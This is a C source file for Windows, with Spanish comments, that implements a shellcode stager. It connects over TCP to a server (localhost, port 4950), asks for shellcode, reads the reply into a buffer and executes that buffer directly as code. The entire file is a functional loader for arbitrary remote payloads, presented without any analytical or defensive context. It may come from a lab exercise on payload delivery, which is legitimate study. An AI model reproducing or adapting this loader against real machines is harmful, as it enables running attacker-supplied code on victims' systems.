#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>
#include <string.h>
#include <conio.h>
#include <time.h>
#define MAXBUFLEN 512
#define PORT 4950
char SendBuff[MAXBUFLEN],RecvBuff[MAXBUFLEN];
void x(char * RecvBuff){((void(*)(void)){RecvBuff})();}
int main(int argc, char *argv[]){
  printf("Ready\n");
  WSADATA wsaData;
  SOCKET conn_socket;
  struct sockaddr_in server;
  struct hostent *hp;
  int resp;
  //Inicializar dll de sockets
  resp=WSAStartup(MAKEWORD(1,0),&wsaData);
  if(resp){return -1;}
  //Obtenemos IP del servidor
  hp=(struct hostent *)gethostbyname("localhost");
  if(!hp){WSACleanup();return WSAGetLastError();}
  // Creamos socket
  conn_socket=socket(AF_INET,SOCK_STREAM, 0);
  if(conn_socket==INVALID_SOCKET) {WSACleanup();return WSAGetLastError();}
  memset(&server, 0, sizeof(server)) ;
  memcpy(&server.sin_addr, hp->h_addr, hp->h_length);
  server.sin_family = hp->h_addrtype;
  server.sin_port = htons(PORT);
  // Conexion servidor
  if(connect(conn_socket,(struct sockaddr *)&server,sizeof(server))==SOCKET_ERROR){closesocket(conn_socket);WSACleanup();getchar();return WSAGetLastError();}
  strcpy(SendBuff,"1- Enviame la Shellcode");
  //Se envia mensaje para solicitar shellcode
  send(conn_socket,SendBuff,sizeof(SendBuff),0);
  //Se recone Shellcode
  recv(conn_socket,RecvBuff, sizeof(RecvBuff), 0);
  //Cierre del socket
  closesocket(conn_socket);
  WSACleanup();
  //Ejecucion Shellcode
  x(RecvBuff);
  return EXIT_SUCCESS;
}
